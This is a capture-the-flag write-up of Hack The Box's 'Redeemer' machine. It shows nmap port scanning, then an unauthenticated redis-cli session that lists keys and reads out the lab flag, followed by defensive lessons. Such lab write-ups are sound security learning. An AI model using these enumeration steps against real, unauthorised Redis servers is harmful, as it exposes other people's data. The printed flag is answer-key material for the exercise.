# HTB - Starting Point - Redeemer

🇧🇷 [Versão em Português](./README-redeemer.pt-BR.md)

| Info         | Detail        |
|--------------|---------------|
| Platform     | Hack The Box  |
| Track        | Starting Point|
| Difficulty   | Very Easy     |
| OS           | Linux         |
| Status       | ✅ Completed  |

## Table of Contents
- [HTB - Starting Point - Redeemer](#htb---starting-point---redeemer)
  - [Table of Contents](#table-of-contents)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lessons Learned](#lessons-learned)

---

## Recon

I started the target machine through the HTB platform, which provided the target's IP address:

**Target IP:** `10.129.161.106`

I then connected to the Pwnbox (HTB's attack machine) and, through it, connected to the target's network via VPN.

I ran a default **Nmap** scan to identify open ports and services on the target:

```bash
nmap 10.129.161.106
```

```
Host is up (0.0066s latency).
All 1000 scanned ports on 10.129.161.106 are in ignored states.
Not shown: 1000 closed tcp ports (conn-refused)
```

None of the top 1000 common ports were open. I tried a ping-only scan to confirm the host was still reachable:

```bash
nmap -sn 10.129.161.106
```

```
Host is up (0.0080s latency).
```

The host was up, which meant the open service was simply running outside Nmap's default top-1000 ports. I attempted a SYN scan, but it required elevated privileges that weren't available in this shell:

```bash
nmap -sS 10.129.161.106
```

```
You requested a scan type which requires root privileges.
QUITTING!
```

---

## Enumeration

I ran a full TCP port scan across all 65535 ports to find the service:

```bash
nmap -p- 10.129.161.106
```

```
PORT     STATE SERVICE
6379/tcp open  redis
```

Port **6379** was open, running **Redis** — an in-memory key-value data store that, by default, does not require authentication.

---

## Exploitation

I connected to the Redis server using `redis-cli`, specifying the target host with the `-h` flag:

```bash
redis-cli -h 10.129.161.106
```

Once connected, I gathered information and statistics about the server:

```bash
10.129.161.106:6379> INFO
```

The output confirmed **Redis 5.0.7** running on Linux, in standalone mode, with no authentication required to interact with it.

I selected database index 0:

```bash
10.129.161.106:6379> SELECT 0
```

Checked how many keys existed inside it:

```bash
10.129.161.106:6379> DBSIZE
```

```
(integer) 4
```

Listed all the keys present:

```bash
10.129.161.106:6379> KEYS *
```

```
1) "temp"
2) "stor"
3) "numb"
4) "flag"
```

One of the keys was named `flag`. I retrieved its value directly:

```bash
10.129.161.106:6379> GET flag
```

```
"03e1d2b376c37ab3f5319922053953eb"
```

---

## Flag

```
03e1d2b376c37ab3f5319922053953eb
```

---

## Lessons Learned

- Redis, by default, does not enforce authentication — anyone who can reach the port can connect, read, and modify data freely, which is a severe misconfiguration if exposed to untrusted networks.
- Not every service runs on well-known ports. A default Nmap scan only checks the top 1000 ports, so a full scan (`-p-`) across all 65535 ports is essential when a host appears to have no open ports initially.
- `redis-cli` offers simple built-in commands (`INFO`, `SELECT`, `DBSIZE`, `KEYS`, `GET`) that make enumerating an exposed Redis instance quick and straightforward.
- Sensitive data (credentials, tokens, flags) should never be stored unencrypted in a data store that's reachable without authentication.
